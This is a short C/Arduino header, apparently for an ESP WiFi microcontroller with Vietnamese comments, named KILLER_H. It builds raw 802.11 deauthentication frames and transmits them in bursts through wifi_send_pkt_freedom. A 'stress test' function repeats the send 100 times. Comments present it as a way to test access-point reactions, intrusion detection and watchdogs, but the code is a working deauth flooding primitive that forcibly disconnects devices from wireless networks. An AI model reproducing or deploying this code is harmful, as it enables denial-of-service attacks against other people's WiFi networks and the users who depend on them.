#ifndef KILLER_H
#define KILLER_H

#include <WiFi.h>

// Danh sách MAC giả lập (ví dụ)
const uint8_t fakeMAC[6] = {0xDE, 0xAD, 0xBE, 0xEF, 0xFE, 0xED};

// Gửi gói deauth đơn giản
void sendDeauthPacket(const uint8_t *targetMAC, const uint8_t *bssid) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, // Type: Deauthentication
        0x00, 0x00, // Duration
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Destination (AP or STA)
        targetMAC[0], targetMAC[1], targetMAC[2], targetMAC[3], targetMAC[4], targetMAC[5], // Source
        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // BSSID
        0x00, 0x00, // Frag/Seq number
        0x07, 0x00  // Reason code: Class 3 frame received from nonassociated STA
    };

    // Gửi thử 20 lần để kiểm tra khả năng phản ứng mạng
    for (int i = 0; i < 20; i++) {
        wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
        delay(10);
    }
}

// Gửi nhiều packet để kiểm tra phản ứng WiFi (có thể dùng để test IDS, watchdog)
void stressTestAP(const char *ssid) {
    Serial.println("[+] Bắt đầu gửi tín hiệu giả để kiểm tra AP: " + String(ssid));
    for (int i = 0; i < 100; i++) {
        sendDeauthPacket(fakeMAC, fakeMAC);
        delay(50);
    }
    Serial.println("[+] Hoàn tất stress test.");
}

#endif

